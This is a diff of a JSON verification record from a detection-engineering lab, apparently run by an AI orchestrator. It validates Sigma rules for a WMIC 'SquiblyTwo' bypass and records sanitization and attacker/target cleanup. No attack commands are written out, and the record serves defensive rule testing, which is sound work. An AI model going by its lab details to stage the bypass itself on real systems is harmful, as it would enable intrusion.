+    "scenario_coverage": "5/6 grounded in-scope use-cases verified (83%, above 0.6 floor)",
+    "iteration_1": {"decision": "BLOCKED", "exit_code": 1, "commit": "a5e5a22b8feeb1781a128dbfaa58f2fc0bfb9298", "blocker": "remote UNC selector was under-escaped; corrected to exact SigmaHQ master logic"},
+    "precision_reconciliation": {"proc_creation_win_wmic_squiblytwo_bypass.yml": "medium/alert/high", "proc_creation_win_wmic_susp_process_creation.yml": "medium/alert/high"}
+  },
   "validation": {
-    "pysigma": "All six Sigma rules parsed successfully with pySigma 1.5.0 on 2026-08-10.",
-    "json": "verification.json and both sanitized evidence JSON files passed JSON validation on 2026-08-10."
+    "rule_harness": {"rule_count": 11, "measured_count": 9, "blocking_count": 0, "syntax_failures": 0, "numeric_quantifier_above_one": false},
+    "merge_gate": {"iterations": 2, "exit_code": 0, "verdict": "PASS", "measured_commit": "80d5cb3"},
+    "json": "verification.json and sanitized evidence JSON validated on 2026-08-15"
   },
-  "sanitization": {
-    "raw_pcap_committed": false,
-    "raw_evtx_committed": false,
-    "raw_event_export_committed": false,
-    "raw_nsm_logs_committed": false,
-    "host_data_committed": false,
-    "notes": "Only selected telemetry fields, hashes, timestamps, aggregate counts, lab topology values, and benign marker content are committed."
-  },
-  "cleanup_confirmation": {
-    "attacker": {
-      "confirmed_at": "2026-08-10T01:47:32.506071416Z",
-      "http_service": "inactive",
-      "served_directory_present": false,
-      "port_18082_listener_present": false
-    },
-    "target": {
-      "snapshot": "win_verify_baseline",
-      "rollback_task_exit": "OK",
-      "confirmed_at": "2026-08-10T01:59:57.9788856Z",
-      "sysmon_service": "Running",
-      "sysmon_config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
-      "defender_real_time_protection_enabled": false,
-      "marker_present": false,
-      "pcap_present": false,
-      "telemetry_directory_present": false
-    }
-  },
-  "verified_at": "2026-08-10T01:46:11.3628034Z",
+  "sanitization": {"raw_pcap_committed": false, "raw_evtx_committed": false, "raw_event_export_committed": false, "raw_nsm_logs_committed": false, "credentials_committed": false, "host_data_committed": false, "committed": "selected telemetry fields, aggregate counts, hashes, lab-only names/addresses, benign commands and marker results"},
+  "cleanup_confirmation": {"attacker_listeners_stopped": true, "target_post_each_run_rollback": "OK", "target_final_snapshot": "win_verify_baseline", "final_rollback_verification": "Proxmox rollback task OK; VM 104 stopped; baseline snapshot present"},
+  "verified_at": "2026-08-15T12:04:08.0075142Z",
   "verifier": "Codex lab orchestrator"
 }
